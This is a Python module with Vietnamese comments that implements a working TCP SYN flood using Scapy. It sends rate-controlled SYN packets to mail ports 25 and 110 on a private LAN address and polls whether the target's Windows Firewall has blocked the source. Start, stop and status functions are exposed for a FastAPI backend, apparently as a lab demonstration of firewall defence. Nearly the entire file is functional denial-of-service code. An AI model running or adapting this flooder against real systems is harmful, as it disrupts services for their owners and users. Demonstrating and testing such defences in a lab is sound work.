import random
import socket
import threading
import time
from typing import Dict
from scapy.all import IP, TCP, send, conf

# Tắt thông báo thừa của Scapy
conf.verb = 0

# Biến lưu trạng thái phiên giả lập SYN Flood để Backend/Frontend theo dõi
syn_flood_state: Dict = {
    "is_running": False,
    "target_ip": "",
    "packets_sent": 0,
    "current_pps": 0,
    "status_message": "Sẵn sàng",
    "blocked_by_firewall": False
}

_stop_event = threading.Event()


def _check_port_open(target_ip: str, port: int = 25, timeout: float = 0.8) -> bool:
    """Kiểm tra nhanh xem cổng dịch vụ Mail còn mở hay đã bị Windows Firewall chặn"""
    try:
        with socket.create_connection((target_ip, port), timeout=timeout):
            return True
    except Exception:
        return False


def _syn_flood_worker(target_ip: str, target_ports: list, packets_per_sec: int):
    """Luồng chạy ngầm bắn gói tin TCP SYN với tần suất kiểm soát được"""
    global syn_flood_state
    syn_flood_state.update({
        "is_running": True,
        "target_ip": target_ip,
        "packets_sent": 0,
        "current_pps": packets_per_sec,
        "status_message": f"Đang tấn công SYN Flood vào {target_ip} ({packets_per_sec} gói/giây)...",
        "blocked_by_firewall": False
    })

    # Tính toán thời gian nghỉ giữa mỗi gói tin để giữ đúng tốc độ packets_per_sec
    delay = 1.0 / max(packets_per_sec, 1)
    packet_count = 0
    last_check_time = time.time()

    while not _stop_event.is_set():
        target_port = random.choice(target_ports)
        source_port = random.randint(1024, 65535)

        # Tạo gói tin TCP thô với cờ SYN (flags="S")
        packet = IP(dst=target_ip) / TCP(dport=target_port, sport=source_port, flags="S")
        send(packet, verbose=False)

        packet_count += 1
        syn_flood_state["packets_sent"] = packet_count

        # In log mỗi 50 gói để dễ quan sát trên Terminal mà không bị trôi quá nhanh
        if packet_count % 50 == 0:
            msg = f"Đã bắn {packet_count} gói TCP SYN tới {target_ip} (Tốc độ ~{packets_per_sec} gói/s)"
            print(f"[*] {msg}")
            syn_flood_state["status_message"] = msg

        # Cứ mỗi 1.5 giây kiểm tra xem Windows Firewall của Tiên đã khóa IP chưa
        if time.time() - last_check_time >= 1.5:
            last_check_time = time.time()
            if not _check_port_open(target_ip, target_ports[0]):
                msg = f"THÀNH CÔNG! IP đã bị Windows Firewall của Tiên chặn sau {packet_count} gói SYN."
                print(f"\n[✔] {msg}")
                syn_flood_state["blocked_by_firewall"] = True
                syn_flood_state["status_message"] = msg
                break

        time.sleep(delay)

    if _stop_event.is_set() and not syn_flood_state["blocked_by_firewall"]:
        syn_flood_state["status_message"] = f"Đã dừng giả lập SYN Flood theo lệnh Admin (Tổng: {packet_count} gói)."

    syn_flood_state["is_running"] = False


def start_syn_flood_simulation(
    target_ip: str = "192.168.64.121",
    target_ports: list = None,
    packets_per_sec: int = 150
) -> Dict:
    """Hàm để Backend FastAPI gọi khi Frontend bấm nút Bắt đầu SYN Flood"""
    if syn_flood_state["is_running"]:
        return {"status": "warning", "message": "Kịch bản SYN Flood đang chạy rồi!"}

    if target_ports is None:
        target_ports = [25, 110]

    _stop_event.clear()
    thread = threading.Thread(
        target=_syn_flood_worker,
        args=(target_ip, target_ports, packets_per_sec),
        daemon=True
    )
    thread.start()
    return {
        "status": "started",
        "message": f"Đã kích hoạt SYN Flood ({packets_per_sec} gói/s) tới {target_ip} cổng {target_ports}"
    }


def stop_syn_flood_simulation() -> Dict:
    """Hàm để Backend FastAPI gọi khi Frontend bấm nút Dừng"""
    if not syn_flood_state["is_running"]:
        return {"status": "idle", "message": "Không có tiến trình SYN Flood nào đang chạy."}
    _stop_event.set()
    return {"status": "stopping", "message": "Đang gửi tín hiệu dừng SYN Flood..."}


def get_syn_flood_status() -> Dict:
    """Trả về số gói tin đã bắn và trạng thái bị chặn cho Frontend"""
    return syn_flood_state


# Vẫn hỗ trợ chạy độc lập trực tiếp từ Terminal (Yêu cầu chạy bằng quyền Administrator)
if __name__ == "__main__":
    print("[!] Chạy độc lập script SYN Flood (Tốc độ 150 gói/s - Nhấn Ctrl+C để dừng)...")
    try:
        _syn_flood_worker("192.168.64.121", [25, 110], packets_per_sec=150)
    except KeyboardInterrupt:
        _stop_event.set()
        print("\n[*] Đã dừng thủ công.")
